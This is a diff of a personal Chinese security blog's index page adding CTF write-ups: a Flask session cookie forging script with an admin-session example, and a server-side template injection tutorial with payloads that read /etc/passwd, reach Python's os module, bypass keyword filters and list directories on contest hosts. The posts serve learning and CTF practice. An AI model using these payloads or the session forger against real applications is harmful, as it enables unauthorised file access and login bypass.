@@ -298,6 +298,512 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/07/flask伪造session/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="木偶">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="木偶's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/07/flask伪造session/" itemprop="url">flask伪造session</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-07T21:48:30+08:00">
+                2019-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/07/flask伪造session/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/07/flask伪造session/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  508 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="flask伪造session"><a href="#flask伪造session" class="headerlink" title="flask伪造session"></a>flask伪造session</h2><p>github的脚本</p>
+<pre><code>&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;
+__author__ = &apos;Wilson Sumanang, Alexandre ZANNI&apos;
+
+import sys
+import zlib
+from itsdangerous import base64_decode
+import ast
+
+
+import argparse
+
+
+parser = argparse.ArgumentParser(
+        description=&apos;Flask Session Cookie Decoder/Encoder&apos;,
+        epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)
+
+
+subparsers = parser.add_subparsers(help=&apos;sub-command help&apos;, dest=&apos;subcommand&apos;)
+
+parser_encode = subparsers.add_parser(&apos;encode&apos;, help=&apos;encode&apos;)
+parser_encode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;,
+                        help=&apos;Secret key&apos;, required=True)
+parser_encode.add_argument(&apos;-t&apos;, &apos;--cookie-structure&apos;, metavar=&apos;&lt;string&gt;&apos;,
+                        help=&apos;Session cookie structure&apos;, required=True)
+
+
+parser_decode = subparsers.add_parser(&apos;decode&apos;, help=&apos;decode&apos;)
+parser_decode.add_argument(&apos;-s&apos;, &apos;--secret-key&apos;, metavar=&apos;&lt;string&gt;&apos;,
+                        help=&apos;Secret key&apos;, required=False)
+parser_decode.add_argument(&apos;-c&apos;, &apos;--cookie-value&apos;, metavar=&apos;&lt;string&gt;&apos;,
+                        help=&apos;Session cookie value&apos;, required=True)
+
+
+args = parser.parse_args()
+
+
+from flask.sessions import SecureCookieSessionInterface
+
+
+class MockApp(object):
+
+def __init__(self, secret_key):
+    self.secret_key = secret_key
+
+
+def session_cookie_encoder(secret_key, session_cookie_structure):
+&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;
+try:
+    app = MockApp(secret_key)
+
+    session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+    si = SecureCookieSessionInterface()
+    s = si.get_signing_serializer(app)
+
+    return s.dumps(session_cookie_structure)
+except Exception as e:
+    return &quot;[Encoding error]{}&quot;.format(e)
+
+
+def session_cookie_decoder(session_cookie_value, secret_key=None):
+&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
+try:
+    if(secret_key==None):
+        compressed = False
+        payload = session_cookie_value
+
+        if payload.startswith(b&apos;.&apos;):
+            compressed = True
+            payload = payload[1:]
+
+        data = payload.split(&quot;.&quot;)[0]
+
+        data = base64_decode(data)
+        if compressed:
+            data = zlib.decompress(data)
+
+        return data
+    else:
+        app = MockApp(secret_key)
+
+        si = SecureCookieSessionInterface()
+        s = si.get_signing_serializer(app)
+
+        return s.loads(session_cookie_value)
+except Exception as e:
+    return &quot;[Decoding error]{}&quot;.format(e)
+
+
+if __name__ == &quot;__main__&quot;:
+if(args.subcommand == &apos;encode&apos;):
+    if(args.secret_key is not None and args.cookie_structure is not None):
+        print(session_cookie_encoder(args.secret_key, args.cookie_structure))
+elif(args.subcommand == &apos;decode&apos;):
+    if(args.secret_key is not None and args.cookie_value is not None):
+        print(session_cookie_decoder(args.cookie_value,args.secret_key))
+    elif(args.cookie_value is not None):
+        print(session_cookie_decoder(args.cookie_value))
+</code></pre><p>#</p>
+<pre><code>加密示例 $ python2 session_cookie_manager.py encode -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos; -t &apos;{&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;}&apos;
+输出：eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw
+
+解密示例 $ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos; -s &apos;.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&apos;
+输出：{u&apos;username&apos;: &apos;admin&apos;, u&apos;number&apos;: &apos;326410031505&apos;}
+
+无密钥：$ python2 session_cookie_manager.py decode -c &apos;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&apos;
+</code></pre><p>hgame的happypython就是先解密session再将id改为1后加密，替换session即可登陆。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/07/SSTI-1/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="木偶">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="木偶's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/07/SSTI-1/" itemprop="url">SSTI(1)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-07T09:52:33+08:00">
+                2019-04-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/07/SSTI-1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/07/SSTI-1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>前段时间被转专业考试逼疯，鸽了一堆比赛（不鸽也不会做，菜哭）把之前的知识补一下，从cg讲的ssti开始吧。<br>hexo插件问题会把两个大括号里的内容按变量处理，下文用一个代替</p>
+<h2 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h2><p>什么是SSTI？</p>
+<p>SSTI全称Server-Side-Template-Injection，即服务端模版注入攻击。</p>
+<p>攻击成因是服务端模版引擎将用户的输入直接渲染进模版，而未做过滤或者对象关系映射(ORM)。</p>
+<p>这样，攻击者可以控制渲染进模版的内容。通过直接输入模版渲染的关键词例如{ }，即可将恶意代码注入模版中执行。最严重的后果是getshell。</p>
+<p>现在有很多常见的模版渲染引擎，而最常用也最长出问题的Web框架就是基于Python的Flask框架了。</p>
+<h2 id="注入姿势："><a href="#注入姿势：" class="headerlink" title="注入姿势："></a>注入姿势：</h2><h3 id="内省config对象"><a href="#内省config对象" class="headerlink" title="内省config对象"></a>内省config对象</h3><p>config对象是一个Flask模板全局变量，代表“当前配置对象(flask.config）”。它是一个类似于字典的对象，其中包含了应用程序所有的配置值，包含若干独特方法的子类：from_envvar，from_object，from_pyfile，以及root_path。在大多数情况下，会包含数据库连接字符串，第三方服务凭据，SECRET_KEY之类的敏感信息。</p>
+<p>对于新加载的模块，from_object方法会将那些变量名全是大写的属性添加到config对象中。注入payload{ config.items() }就可以轻松查看这些配置了。　　</p>
+<h3 id="使用非常重要的内省组件：-mro-和-subclasses-属性。"><a href="#使用非常重要的内省组件：-mro-和-subclasses-属性。" class="headerlink" title="使用非常重要的内省组件：__mro__和__subclasses__属性。"></a>使用非常重要的内省组件：__mro__和__subclasses__属性。</h3><p>__mro__中的MRO代表方法解析顺序，并且在这里定义为，“是一个包含类的元组，而其中的类就是在方法解析的过程中在寻找父类时需要考虑的类”。__mro__属性以包含类的元组来显示对象的继承关系，它的父类，父类的父类，一直向上到object（如果是使用新式类的话）。它是每个对象的元类属性，但它却是一个隐藏属性，因为Python在进行内省时明确地将它从dir的输出中移除了（见Objects/object.c的第1812行）。</p>
+<p>__subclasses__属性则在这里被定义为一个方法，“每个新式类保留对其直接子类的一个弱引用列表。此方法返回那些引用还存在的子类”。</p>
+<p>使用__mro__属性来访问对象的父类，使用__subclasses__属性来访问对象的子类</p>
+<p>使用索引2来选择object类。现在我们到达了object类，我们使用/<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）<br>找到object:<br>    { ‘’.__class__.__mro__[2].__subclasses__() }</p>
+<p>任意文件读取：<br>    { ‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read() }</p>
+<h4 id="os-模块"><a href="#os-模块" class="headerlink" title="[os]模块"></a>[os]模块</h4><p>通过os模块可以进行一些文件的操作</p>
+<pre><code>{[].\__class__.\__base__.\__subclasses__()}
+</code></pre><p>的方法来访问所有模块<br><img src="https://img-blog.csdn.net/20181004223429919?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>访问os模块都是从warnings.catch_warnings模块入手的。找到catch_warnings的位置(上面查到的所有模块的索引，这里是59，即第59个模块)；</p>
+<p>知道了位置后，再用func_globals看看该模块有哪些global函数;</p>
+<p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}<br><img src="https://img-blog.csdn.net/20181004224339752?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br>这里能看到linecache，我们要访问的os模块就在这里，现在我们看看这个模块的各种属性：</p>
+<p>在url后面输入<br>    {[].__class__.__base__.__subclasses__()[59].__init__.func_globals[‘linecache’].__dict__}<br>然后在很长的返回值里就可以找到os模块了<br>然后就可以用</p>
+<pre><code>{[].\__class__.\__base__.\__subclasses__()[59].\__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;]}
+</code></pre><p>来代替os模块的使用了，之所以写__dict__[‘o’+’s’]，而不写__dict__[‘os’],是因为os这个字符串被禁用了，只能使用python里面字符串的拼接绕过现在os.read()</p>
+<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].read()
+
+[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].open()
+
+
+[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;.&apos;)
+</code></pre><p>cg题的payload</p>
+<pre><code>http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].listdir(&apos;..&apos;)%7D%7D 
+看到flag文件
+文件读取打开
+
+http://ssh2.evi0s.com:8080/%7B%7B[].__class__.__base__.__subclasses__()[40](&apos;/Th1s_th3_fl1l1l11llll1g&apos;).read()%7D%7D 
+</code></pre><p>过滤了class怎么办，base64编码绕过，招新赛的payload</p>
+<pre><code>http://132.232.92.163:6733/?name={[].__getattribute__(&apos;X19jbGFzc19f%27.decode(%27base64&apos;)).__base__.__getattribute__([].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__,&apos;X19zdWJjbGFzc2VzX18=&apos;.decode(&apos;base64&apos;))()[58].__init__.func_globals[&apos;linecache&apos;].__dict__.os.listdir(&quot;/home/blacsheep/&quot;)} 
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/14/hgame-php/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -580,7 +1086,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  37 字
+                  243 字
                 </span>
               
 
@@ -620,6 +1126,22 @@
         
           
             <p>hgame的爬虫题，做到一半就卡住了，菜是原罪，整理一下关于爬虫的知识，requests库、urllib库、re库和Beautifulsoup库。<br>咕~</p>
+<p>hgame里的baby-spider，一开始直接被反日，虚拟机关机，提醒写爬虫要加浏览器伪造，后来一直显示you are wrong，最后看了别人的脚本才发现是css上出了问题，把第十次之后的cookie打印下来再传到浏览器上可以发现爬取的题目与显示的题目无关，网页上的渲染把题目修改了，加载公式时在network里可以看到引用了一个新的字体，利用python 里的函数 str.maketrans() 可以把css渲染后的字体转换出来</p>
+<pre><code>fuck = str.maketrans(&apos;01345679&apos;, &apos;10694357&apos;)  
+question = getquestion1()
+b = question.translate(fuck)
+</code></pre><p>第三步</p>
+<pre><code>    .question-container span{
+display: none;
+}
+.question-container{
+font-family: Ariali;
+font-weight: bold;
+}
+.question-container:after{
+content:&quot;(776299203/883952569)+(547789483)*683263066-(215127140)=?&quot;;
+}
+</code></pre><p>直接爬取style.css里的 .question-container:after里的content内容</p>
 
           
         
@@ -830,7 +1352,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/19/SQL注入/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/27/SQL注入/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="木偶">
@@ -849,7 +1371,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/01/19/SQL注入/" itemprop="url">SQL攻击</a></h1>
+                <a class="post-title-link" href="/2019/01/27/SQL注入/" itemprop="url">SQL攻击</a></h1>
         
 
         <div class="post-meta">
@@ -861,8 +1383,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-19T12:11:09+08:00">
-                2019-01-19
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-27T12:11:09+08:00">
+                2019-01-27
               </time>
             
 
@@ -902,8 +1424,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/01/19/SQL注入/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/01/19/SQL注入/" itemprop="commentCount"></span>
+                <a href="/2019/01/27/SQL注入/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/01/27/SQL注入/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -966,7 +1488,7 @@
           <h2 id="hgame-sql"><a href="#hgame-sql" class="headerlink" title="hgame sql"></a>hgame sql</h2><p>hgame两道sql题都不算太难，有验证不过没过滤，再次响起招新被时间盲注支配的恐惧~，整理一下大致的框架，<br></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2019/01/19/SQL注入/#more" rel="contents">
+            <a class="btn" href="/2019/01/27/SQL注入/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1758,359 +2280,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/同源策略/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="木偶">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="木偶's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/19/同源策略/" itemprop="url">同源策略</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T17:16:54+08:00">
-                2018-11-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/基础/" itemprop="url" rel="index">
-                    <span itemprop="name">基础</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/11/19/同源策略/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/19/同源策略/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  506 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略</p>
-<h2 id="首先是源的概念："><a href="#首先是源的概念：" class="headerlink" title="首先是源的概念："></a>首先是源的概念：</h2><p>•    源（origin）就是协议、域名和端口号。 以下是相对于 <a href="http://www.a.com/test/index.html" target="_blank" rel="noopener">http://www.a.com/test/index.html</a> 的同源检测<br>•    <a href="http://www.a.com/dir/page.html" target="_blank" rel="noopener">http://www.a.com/dir/page.html</a> —-成功<br>•    <a href="http://www.child.a.com/test/index.html" target="_blank" rel="noopener">http://www.child.a.com/test/index.html</a> —-失败，域名不同<br>•    <a href="https://www.a.com/test/index.html" target="_blank" rel="noopener">https://www.a.com/test/index.html</a> —-失败，协议不同<br>所以所谓同源就是协议、域名和端口号均相同。</p>
-<h2 id="什么是同源策略："><a href="#什么是同源策略：" class="headerlink" title="什么是同源策略："></a>什么是同源策略：</h2>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/11/19/同源策略/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/17/黑白盒/hello-world/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="木偶">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="木偶's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/17/黑白盒/hello-world/" itemprop="url">博客初建</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-17T17:07:52+08:00">
-                2018-11-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/11/17/黑白盒/hello-world/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/17/黑白盒/hello-world/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  24 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><center>从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。<center></center></center></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -2154,7 +2330,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
